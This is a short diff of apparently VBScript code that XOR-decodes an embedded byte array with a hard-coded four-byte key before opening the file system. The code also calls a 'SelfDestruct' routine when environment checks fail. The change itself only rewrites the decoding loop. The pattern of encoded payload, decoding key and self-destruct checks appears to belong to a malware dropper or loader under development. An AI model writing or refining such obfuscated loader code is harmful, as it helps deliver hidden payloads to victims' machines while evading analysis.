@@ -16,8 +16,10 @@ If VarType(raw) <> 8209 Then SelfDestruct
 key = Array(&H3A, &H97, &H79, &HB0)
 n = UBound(raw) : lb = LBound(raw)
 ReDim dst(n - lb)
-For i = lb To n
-  dst(i - lb) = CByte(raw(i) Xor key(((i - lb) Mod 4)))
+idx = 0
+For Each b In raw
+  dst(idx) = CByte(b Xor key((idx Mod 4)))
+  idx = idx + 1
 Next
 Set fso = CreateObject("Scripting.FileSystemObject")
 If fso Is Nothing Then SelfDestruct
